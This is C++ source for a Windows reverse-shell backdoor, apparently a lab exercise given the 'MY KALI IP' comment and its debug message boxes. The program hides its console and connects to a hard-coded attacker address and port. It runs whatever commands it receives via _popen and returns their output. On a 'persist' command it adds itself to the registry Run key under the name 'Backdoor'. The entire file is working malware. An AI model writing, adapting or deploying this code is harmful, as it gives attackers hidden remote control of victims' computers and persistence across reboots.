// mal_test.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
//

#include "pch.h"
#include <iostream>
#include <stdlib.h>;
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <winreg.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <Ws2tcpip.h>
#include <io.h>
#include <process.h> 
#include <direct.h>
#pragma warning(disable:4996) 
#pragma comment(lib,"Ws2_32.lib") 
//192.168.56.99 MY KALI IP
#define bzero(p, size) (void) memset((p), 0 , (size))

int sock;
int bootrun() {

	char err[128] =  "fail";
	char suc[128]  = "success";
	TCHAR s2Path[MAX_PATH];
	DWORD pathLen = 0;
	pathLen = GetModuleFileName(NULL, s2Path, MAX_PATH);
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {	
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*s2Path);
	if (RegSetValueEx(NewVal, TEXT("Backdoor"), 0, REG_SZ, (LPBYTE)s2Path, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, err, sizeof(suc), 0);
	return 0;
}

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];
	while (1) {
	jump:
		bzero(buffer, 1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		WCHAR wsz[1024];
		swprintf(wsz, L"%S", buffer);
		LPWSTR bka = wsz;
		MessageBox(NULL, bka, L"connect message", MB_OK);


		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("persist", buffer, 3) == 0){
			bootrun();
}
		else{
			FILE *fp;
			fp = _popen(buffer, "r"); //作為進程打開
			while (fgets(container, 1024, fp) != NULL) {


				strcat(total_response, container); //連接字串
			}
				
				WCHAR wsc[1024];
				swprintf(wsc, L"%S", total_response);
				LPWSTR cka = wsc;
				MessageBox(NULL, cka, L"command response send", MB_OK);

				int k;

				k = send(sock, total_response, sizeof(total_response), 0);

				wchar_t wsd[256];
				wsprintfW(wsd, L"%d", k);
				MessageBox(NULL, wsd, L"response len", MB_OK);

				fclose(fp);

			}
		}

}
			
	


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
	HWND stealth; //HANDLE
	AllocConsole(); //產生一個新的console
	stealth = FindWindowA("ConsoleWindowClass", NULL); //檢索 1 類別名 2 窗口名
	ShowWindow(stealth, 0); //設置nCmdShow為0 隱藏視窗並啟動另一視窗)
	system("chcp 65001");
	struct sockaddr_in servaddr;
	unsigned short servport;
	char *servip;
	char iptemp[] = "192.168.56.99";
	WSADATA wsaData;
	servip = iptemp;
	servport = 50008;

	//成功則返回0
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);//ipv4,雙向流,默認協議
	memset(&servaddr, 0, sizeof(servaddr));//填充0
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(servip);
	servaddr.sin_port = htons(servport);

	start:
	while (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) != 0) { //嘗試連接(如果成功返回0)
		Sleep(10);
		MessageBox(NULL, L"no connect", L"connect", MB_OK);
		goto start;
	}
	Shell();
}


// 執行程式: Ctrl + F5 或 [偵錯] > [啟動但不偵錯] 功能表
// 偵錯程式: F5 或 [偵錯] > [啟動偵錯] 功能表

// 開始使用的秘訣: 
//   1. 使用 [方案總管] 視窗，新增/管理檔案
//   2. 使用 [Team Explorer] 視窗，連線到原始檔控制
//   3. 使用 [輸出] 視窗，參閱組建輸出與其他訊息
//   4. 使用 [錯誤清單] 視窗，檢視錯誤
//   5. 前往 [專案] > [新增項目]，建立新的程式碼檔案，或是前往 [專案] > [新增現有項目]，將現有程式碼檔案新增至專案
//   6. 之後要再次開啟此專案時，請前往 [檔案] > [開啟] > [專案]，然後選取 .sln 檔案
